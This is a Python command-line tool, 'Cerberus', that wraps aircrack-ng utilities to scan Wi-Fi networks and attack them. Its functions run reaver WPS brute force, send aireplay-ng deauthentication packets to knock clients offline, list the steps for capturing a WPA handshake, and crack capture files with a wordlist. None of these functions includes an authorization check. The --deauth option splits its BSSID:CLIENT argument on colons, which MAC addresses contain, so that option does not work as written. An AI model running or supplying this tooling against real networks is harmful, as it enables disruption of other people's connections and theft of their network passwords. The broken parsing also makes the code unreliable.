#!/usr/bin/env python3
"""
Cerberus WiFi Security Module
Wireless network security assessment tools
"""

import subprocess
import argparse
import re
from pathlib import Path


class WiFiScanner:
    """WiFi security assessment"""
    
    def __init__(self):
        self.results = []
    
    def check_tool(self, tool_name):
        """Check if tool is installed"""
        try:
            result = subprocess.run(
                ["which", tool_name],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except:
            return False
    
    def airodump_scan(self, interface=None, channel=None):
        """Scan for WiFi networks using airodump-ng"""
        if not self.check_tool("airodump-ng"):
            return {"error": "airodump-ng not installed (apt install aircrack-ng)"}
        
        # Find wireless interface
        if not interface:
            interface = self._find_interface()
        
        if not interface:
            return {"error": "No wireless interface found"}
        
        cmd = ["airodump-ng", interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return self._parse_airodump(result.stdout)
        except Exception as e:
            return {"error": str(e)}
    
    def _find_interface(self):
        """Find wireless interface"""
        try:
            result = subprocess.run(
                ["ip", "link", "show"],
                capture_output=True,
                text=True
            )
            for line in result.stdout.split("\n"):
                if "wlan" in line or "wl" in line:
                    match = re.search(r'(\d+): (wlan\d+)', line)
                    if match:
                        return match.group(2)
        except:
            pass
        return None
    
    def _parse_airodump(self, output):
        """Parse airodump output"""
        networks = []
        lines = output.split("\n")
        
        in_networks = False
        for line in lines:
            if "BSSID" in line and "PWR" in line:
                in_networks = True
                continue
            
            if in_networks and line.strip():
                parts = line.split()
                if len(parts) >= 5:
                    try:
                        bssid = parts[0]
                        power = parts[3] if parts[3] != "-1" else "N/A"
                        ssid = " ".join(parts[5:]) if len(parts) > 5 else "Hidden"
                        
                        networks.append({
                            "bssid": bssid,
                            "power": power,
                            "ssid": ssid
                        })
                    except:
                        pass
        
        return {"networks": networks, "count": len(networks)}
    
    def wash_scan(self, interface=None):
        """Scan for WPS-enabled networks"""
        if not self.check_tool("wash"):
            return {"error": "wash not installed"}
        
        if not interface:
            interface = self._find_interface()
        
        if not interface:
            return {"error": "No wireless interface"}
        
        try:
            cmd = ["wash", "-i", interface]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return self._parse_wash(result.stdout)
        except Exception as e:
            return {"error": str(e)}
    
    def _parse_wash(self, output):
        """Parse wash output"""
        networks = []
        for line in output.split("\n"):
            if "BSSID" in line:
                continue
            parts = line.split()
            if len(parts) >= 6:
                networks.append({
                    "bssid": parts[0],
                    "channel": parts[1],
                    "wps": parts[2],
                    "lock": parts[3],
                    "ssid": " ".join(parts[4:])
                })
        return {"wps_networks": networks}
    
    def reaver_brute(self, bssid, interface=None, channel=None):
        """WPS brute force"""
        if not self.check_tool("reaver"):
            return {"error": "reaver not installed"}
        
        if not interface:
            interface = self._find_interface()
        
        cmd = ["reaver", "-i", interface, "-b", bssid, "-v"]
        if channel:
            cmd.extend(["-c", str(channel)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return {"output": result.stdout[-500:]}  # Last 500 chars
        except Exception as e:
            return {"error": str(e)}
    
    def aircrack_test(self, capture_file, wordlist):
        """Test password with aircrack"""
        if not self.check_tool("aircrack-ng"):
            return {"error": "aircrack-ng not installed"}
        
        cmd = ["aircrack-ng", "-w", wordlist, capture_file]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {"output": result.stdout}
        except Exception as e:
            return {"error": str(e)}
    
    def deauth_attack(self, bssid, client, interface=None):
        """Send deauth packets"""
        if not interface:
            interface = self._find_interface()
        
        # Note: Requires monitor mode
        cmd = ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, interface]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return {"status": "sent", "output": result.stdout}
        except Exception as e:
            return {"error": str(e)}
    
    def get_handshake(self, bssid, ssid, interface=None, channel=None):
        """Capture WPA handshake"""
        if not interface:
            interface = self._find_interface()
        
        # Commands to run
        # 1. Start monitor mode
        # 2. Capture with airodump
        # 3. Deauth to trigger handshake
        # 4. Check for handshake with aircrack
        
        return {
            "note": "Manual process required:",
            "steps": [
                f"1. airmon-ng start {interface}",
                f"2. airodump-ng -c {channel or 'auto'} --bssid {bssid} -w capture mon0",
                f"3. aireplay-ng --deauth 5 -a {bssid} mon0",
                f"4. aircrack-ng -w wordlist.txt capture-01.cap"
            ]
        }


def main():
    """CLI Entry Point"""
    parser = argparse.ArgumentParser(description="Cerberus WiFi Security")
    parser.add_argument("interface", nargs="?", help="Wireless interface")
    parser.add_argument("--scan", action="store_true", help="Scan for networks")
    parser.add_argument("--wps", action="store_true", help="Scan for WPS")
    parser.add_argument("--deauth", help="Send deauth (BSSID:CLIENT)")
    
    args = parser.parse_args()
    
    wifi = WiFiScanner()
    
    print("=== Cerberus WiFi Security ===\n")
    
    if args.scan:
        result = wifi.airodump_scan(args.interface)
        if "error" in result:
            print(f"Error: {result['error']}")
        else:
            print(f"Found {result['count']} networks:\n")
            for net in result.get("networks", [])[:15]:
                print(f"  {net['ssid'][:20]:20} | {net['bssid']} | PWR: {net['power']}")
    
    elif args.wps:
        result = wifi.wash_scan(args.interface)
        if "error" in result:
            print(f"Error: {result['error']}")
        else:
            print("WPS-enabled networks:")
            for net in result.get("wps_networks", [])[:10]:
                print(f"  {net['ssid']} | {net['bssid']} | Ch: {net['channel']}")
    
    elif args.deauth:
        parts = args.deauth.split(":")
        if len(parts) == 2:
            result = wifi.deauth_attack(parts[0], parts[1], args.interface)
            print(result)
        else:
            print("Format: --deauth BSSID:CLIENT")
    
    else:
        # Show interface info
        interface = args.interface or wifi._find_interface()
        if interface:
            print(f"Wireless interface: {interface}")
            print("\nUsage:")
            print("  --scan        Scan for networks")
            print("  --wps         Scan for WPS")
            print("  --deauth      Send deauth (BSSID:CLIENT)")
        else:
            print("No wireless interface found")


if __name__ == "__main__":
    main()
